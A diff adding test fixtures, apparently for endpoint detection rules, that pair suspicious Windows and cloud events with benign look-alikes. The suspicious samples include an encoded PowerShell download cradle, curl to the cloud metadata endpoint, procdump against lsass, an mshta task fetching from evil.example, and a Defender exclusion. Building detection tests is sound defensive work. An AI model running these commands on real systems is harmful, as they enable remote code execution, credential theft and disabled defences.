@@ -1,0 +1,10 @@
+{"id":"evt-ps-cradle","process":{"name":"powershell.exe","cmdline":"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0KQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwA="}}
+{"id":"evt-ps-benign","process":{"name":"powershell.exe","cmdline":"powershell -File C:\\scripts\\inventory.ps1"}}
+{"id":"evt-metadata","process":{"name":"curl"},"network":{"dest_ip":"169.254.169.254"}}
+{"id":"evt-metadata-docs","process":{"name":"chrome"},"network":{"dest_ip":"169.254.169.254"}}
+{"id":"evt-lsass","process":{"name":"procdump.exe"},"target":{"name":"lsass.exe"}}
+{"id":"evt-lsass-system","process":{"name":"csrss.exe"},"target":{"name":"lsass.exe"}}
+{"id":"evt-schtask","event":{"action":"scheduled_task_create"},"task":{"command":"mshta https://evil.example/a.hta"}}
+{"id":"evt-schtask-benign","event":{"action":"scheduled_task_create"},"task":{"command":"C:\\Program Files\\Updater\\update.exe"}}
+{"id":"evt-exclusion","event":{"action":"defender_exclusion_add"},"exclusion":{"path":"C:\\Users\\Public\\Temp"}}
+{"id":"evt-exclusion-programfiles","event":{"action":"defender_exclusion_add"},"exclusion":{"path":"C:\\Program Files\\Vendor"}}
